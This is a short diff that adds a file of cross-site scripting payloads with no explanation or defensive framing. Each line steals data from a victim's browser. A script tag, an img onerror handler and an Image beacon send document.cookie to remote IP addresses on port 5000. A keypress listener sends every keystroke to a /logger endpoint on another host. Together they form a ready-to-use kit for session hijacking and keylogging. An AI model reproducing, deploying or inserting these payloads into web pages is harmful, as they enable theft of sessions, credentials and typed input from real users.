@@ -1,0 +1,10 @@
+<script>
+  fetch("http://141.87.56.178:5000/steal?cookie=" + encodeURIComponent(document.cookie));
+</script>
+<img src="x" onerror="fetch('http://141.87.57.41:5000/?cookie=' + encodeURIComponent(document.cookie), {mode:'no-cors'})">
+var i = new Image(0, 0); i.src=`http://141.87.56.178:5000/?cookie=${btoa(document.cookie)}`; document.body.appendChild(i);
+
+
+
+
+var i = new Image(0, 0); document.body.appendChild(i); addEventListener("keypress", (event) => {i.src=`http://141.87.56.248:5002/logger?stroke=${event.key}`});
